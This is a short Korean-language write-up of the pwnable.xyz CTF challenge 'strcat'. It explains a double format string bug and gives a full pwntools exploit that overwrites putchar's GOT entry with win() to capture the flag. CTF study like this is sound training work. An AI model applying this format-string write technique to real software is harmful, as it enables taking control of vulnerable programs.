# [pwnable.xyz] strcat

> Who needs a name extending service? That's probably vulnerable.

## The Bug

![image](https://github.com/user-attachments/assets/0e4187ea-4e74-4144-b5f6-ebf4956d545c)

`main()`에서 format string bug가 연속으로 두 번 발생한다.

## Exploit

![image](https://github.com/user-attachments/assets/0cfdd41e-2314-4c2d-9c3e-d39179ac2a46)

`main()`의 `rsp`에 `rsp+0xf0`의 값이 저장되어 있다. 첫 번째 FSB로 이 위치에 임의의 주소를 쓰고, 두 번째 FSB로 그 주소에 임의의 값을 쓸 수 있다.

`putchar()`의 GOT를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다.

![image](https://github.com/user-attachments/assets/f223028e-a441-415b-9730-d2274e6c2a51)

`desc`의 중간에 null terminator가 삽입되지 않도록 `name`의 길이를 충분히 길게 설정해야 한다.

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30013)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40094C
putchar_got = 0x602020

desc = f"%{str(win)}c%36$ln".encode()
name = f"%{str(putchar_got)}c%6$ln".ljust(len(desc) + 2, "A").encode()

sla(b"Name: ", name)
sla(b"Desc: ", desc)
sla(b"> ", b"3")

r.recvline()

r.interactive()
```

![image](https://github.com/user-attachments/assets/afeff1ff-f397-4139-953d-91308e7629a4)
